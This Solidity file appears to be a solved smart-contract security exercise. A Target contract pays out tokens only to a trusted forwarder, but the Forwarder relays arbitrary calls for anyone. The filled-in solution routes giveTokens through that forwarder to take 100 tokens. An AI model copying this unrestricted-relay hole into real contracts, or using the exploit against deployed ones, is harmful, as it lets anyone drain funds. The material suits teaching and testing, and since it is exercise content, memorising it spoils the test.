// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract YourContract {
    function main(address target, address forwarderAddress) public {
        // make the right function call such that YourContract gets 100 tokens
        // you may only modify this function

        // 1. Prepare the calldata for the Target.giveTokens(address to) function
        //    The 'to' address should be this contract (YourContract)
        //    The function signature is "giveTokens(address)"
        bytes memory calldataForGiveTokens = abi.encodeWithSignature(
            "giveTokens(address)",
            address(this)
        );

        // 2. Get an instance of the Forwarder contract at the given address
        Forwarder forwarderContract = Forwarder(forwarderAddress);

        // 3. Call the Forwarder's 'forward' function
        //    - The first argument to 'forward' is the 'target' contract (which is the Target instance)
        //    - The second argument is the 'calldataForGiveTokens' we prepared
        //    This will make the Forwarder contract call Target.giveTokens(address(this))
        //    Inside Target.giveTokens, msg.sender will be forwarderAddress, satisfying the check
        forwarderContract.forward(target, calldataForGiveTokens);
    }
}

contract Forwarder {
    using Address for address;

    function forward(address target, bytes calldata data) public {
        target.functionCall(data);
    }
}

contract Target {
    IERC20 token;
    address forwarder;

    constructor(address _token, address _forwarder) {
        token = IERC20(_token);
        forwarder = _forwarder;
    }

    function giveTokens(address to) public {
        require(token.balanceOf(address(this)) >= 100, "Not enough tokens");
        require(msg.sender == forwarder, "Not authorized");
        token.transfer(to, 100);
    }
}